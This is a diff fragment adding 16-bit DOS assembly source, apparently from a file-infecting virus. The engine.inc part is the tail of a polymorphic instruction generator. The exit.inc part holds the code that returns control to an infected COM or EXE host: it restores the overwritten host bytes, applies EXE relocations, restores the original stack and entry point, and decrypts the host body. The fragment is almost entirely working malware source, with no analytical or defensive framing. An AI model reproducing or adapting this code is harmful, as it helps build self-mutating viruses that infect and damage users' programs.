+     call free_reg
+mumu:
+     shl al, 3
+     push ax
+     mov ax, 2
+     call random
+     test ax, ax
+     pop ax
+     jz __p
+     test dl, dl
+     jz  __op 
+     ; Prefix, Command 
+     mov ah, es:[di-1]
+     mov 1 ptr es:[di-2], ah
+     dec di
+__op:
+     or al, 0C0h
+     stosb
+     mov ax, 8
+     call random
+     or 1 ptr es:[di-1], al 
+     ret  
+__p:
+     ; al -reg
+     or  al, 110b
+     stosb
+     mov  ax, 0FFFEh
+     call random
+     stosw       
+     ret 
+prefix:
+     segss
+     segcs
+     seges 
+===== end   engine.inc =====
+
+===== begin exit.inc =====
+exit:
+  mov ax, 2 ptr cs:[bp+LostBytes_1]
+  not ax
+  mul ah
+  cmp ax, 72BAh
+  jz  exe_normal
+; выход для COM файлов [Simbi0z/Enuns]
+; call xx
+; pushf/pusha /YES/
+; DS=ES=CS
+com_exit:
+  push cs cs
+  pop  es ds 
+  mov bx, sp
+  db  36h 
+  sub 2 ptr [bx+14+2], 3
+  db  36h
+  mov bx, 2 ptr [bx+14+2] 
+  cmp bx, 100h  ; no enuns ?
+  jz  no_enuns
+  call decrypt_body 
+no_enuns: 
+  mov ax, 20CDh
+LostBytes_1 equ 2 ptr $-2
+  mov 2 ptr ds:[bx], ax
+  mov al, 0
+LostBytes_2 equ 1 ptr $-1
+  mov 1 ptr ds:[bx+2], al
+  popa 
+  ret
+exe2com:
+  call decrypt_body
+  push cs
+  pop  bx 
+  add bx, 10h
+  mov ds, bx
+  mov dx, bx
+  mov si, 0
+  org $-2
+RelocOfs dw 0
+  mov cx, 0
+  org $-2
+RelocNum dw 0
+  add bx, 1234h
+  org $-2
+HdrSize  dw 0      
+__1:
+  lodsw
+  xchg ax, di
+  lodsw
+  add ax, bx
+  mov es, ax
+  add 2 ptr es:[di],  dx
+  loop __1
+  ; copyz body
+  push cs cs
+  pop  ds es
+  mov di, 100h
+  mov si, 2 ptr cs:[bp+HdrSize]
+  shl si, 4
+  add si, di
+  mov cx, bp
+  sub cx, di
+  rep movsb
+  jmp  _exe
+exe_normal:
+  mov ax, cs
+  mov bx, ss
+  cmp ax, bx
+  jz  exe2com
+_exe:
+  mov ah, 62h
+  int 21h
+  xchg ax, bx 
+  mov ds, ax
+  mov es, ax
+  add ax, 10h
+  add 2 ptr cs:[bp+OldCS], ax
+  add 2 ptr cs:[bp+OldSS], ax
+  popa
+  jmp $+2
+  cli
+  mov sp, 1234h
+  org $-2
+OldSS dw  0    
+  mov ss, sp
+  mov sp, 1234h
+  org $-2 
+OldSP dw  0FFFEh
+  sti
+  db 0EAH
+OldIP dw 0
+OldCS dw 0 
+   
+decrypt_body proc
+  mov al, 1 ptr cs:[bp+KeyCom]
+  mov si, 2 ptr cs:[bp+OfsCom]
+  mov cx, 200h
+  add si, 100h  
+__1:
+  add 1 ptr cs:[si], al
+  xor 1 ptr cs:[si], cl
+  sub al, cl
+  inc si  
+  loop __1 
+  ret 
+  endp
+===== end   exit.inc =====
